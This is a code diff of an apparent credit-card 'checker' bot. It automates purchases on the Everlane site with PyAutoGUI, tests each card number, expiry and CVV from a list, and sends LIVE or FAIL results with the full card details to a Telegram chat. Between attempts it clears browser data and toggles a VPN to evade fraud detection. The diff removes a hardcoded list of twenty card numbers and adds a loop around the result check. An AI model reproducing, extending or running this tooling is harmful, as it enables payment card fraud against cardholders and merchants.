@@ -2,6 +2,7 @@
 import random
 from pg_bot import PyAutoGUI_Bot
 from funciones import generar_identidad, telegram, separar_cc, crear_lista
+from cc_list import ccs
 
 # Variables y Objetos
 
@@ -181,69 +182,53 @@ def livear(cc_namso, current, total):
 
         bot.locate('place_order', wait=1)
 
-    # Validamos si fue success o failed
+    bot.pause(2)
 
-    # Probablemente hay que hacer un bucle aqui
-    bot.pause(3)
-
-    if bot.locate('thanks', click=False) or bot.locate('live', click=False) or bot.locate('survey', click=False):
-        print(f'CC: {cc} - Live!')
-        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: LIVE! ✅\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]}\nCVV: {cc[3]}", '-726102881')
-        bot.press_both('ctrl', 'l')
-        bot.copypaste('chrome://settings/clearBrowserData')
-        bot.press('enter')
-        bot.locate('clear_data')
-        bot.pause(0.10)
-        bot.press_both('alt', 'f4')
-
-        preparar_worksplace()
-
-    elif bot.locate('error1', click=False):
-        print('There was a problem processing your card. Please call your card issuer or try a different card.')
-        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nThere was a problem processing your card. Please call your card issuer or try a different card.", '-726102881')
-    elif bot.locate('out_funds', click=False):
-        print('Your card appears to be out of funds. Please try a new one.')
-        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nYour card appears to be out of funds. Please try a new one.", '-726102881')
-    elif bot.locate('unable_to_add', click=False):
-        print("Unable to add payment method. Please try again.")
-        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nUnable to add payment method. Please try again.", '-726102881')
-        
-        bot.locate('urban_logo')
-        bot.locate('urban_connected', check=True, click=False)
-        bot.locate('urban_turn_off')
-        bot.locate('urban_turn_on', wait=0.5)
-
-        preparar_worksplace()
-
+    # Toco hacerle un bucle
+    while True:
     
+        # Validamos si fue success o failed
 
+        if bot.locate('thanks', click=False) or bot.locate('live', click=False) or bot.locate('survey', click=False):
+            print(f'CC: {cc} - Live!')
+            telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: LIVE! ✅\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]}\nCVV: {cc[3]}", '-726102881')
+            bot.press_both('ctrl', 'l')
+            bot.copypaste('chrome://settings/clearBrowserData')
+            bot.press('enter')
+            bot.locate('clear_data')
+            bot.pause(0.10)
+            bot.press_both('alt', 'f4')
+
+            preparar_worksplace()
+            break
+
+        elif bot.locate('error1', click=False):
+            print('There was a problem processing your card. Please call your card issuer or try a different card.')
+            telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nThere was a problem processing your card. Please call your card issuer or try a different card.", '-726102881')
+            break
+
+        elif bot.locate('out_funds', click=False):
+            print('Your card appears to be out of funds. Please try a new one.')
+            telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nYour card appears to be out of funds. Please try a new one.", '-726102881')
+            break
+
+        elif bot.locate('unable_to_add', click=False):
+            print("Unable to add payment method. Please try again.")
+            telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nUnable to add payment method. Please try again.", '-726102881')
+        
+            bot.locate('urban_logo')
+            bot.locate('urban_connected', check=True, click=False)
+            bot.locate('urban_turn_off')
+            bot.locate('urban_turn_on', wait=0.5)
+
+            preparar_worksplace()
+            break
+
+    print('Script has finished')
     
 # Logica
 
 def main():
-
-    ccs = """
-5217295329247245|11|2023|074
-5217295329250504|11|2023|364
-5217295329200871|11|2023|206
-5217295329241107|11|2023|200
-5217295329203412|11|2023|353
-5217295329253466|11|2023|402
-5217295329215614|11|2023|122
-5217295329267680|11|2023|000
-5217295329287647|11|2023|002
-5217295329258861|11|2023|076
-5217295329210268|11|2023|225
-5217295329262723|11|2023|874
-5217295329254480|11|2023|444
-5217295329287035|11|2023|646
-5217295329286672|11|2023|066
-5217295329261113|11|2023|823
-5217295329253227|11|2023|807
-5217295329238756|11|2023|246
-5217295329270312|11|2023|021
-5217295329264570|11|2023|013
-    """
 
     preparar_worksplace()
 
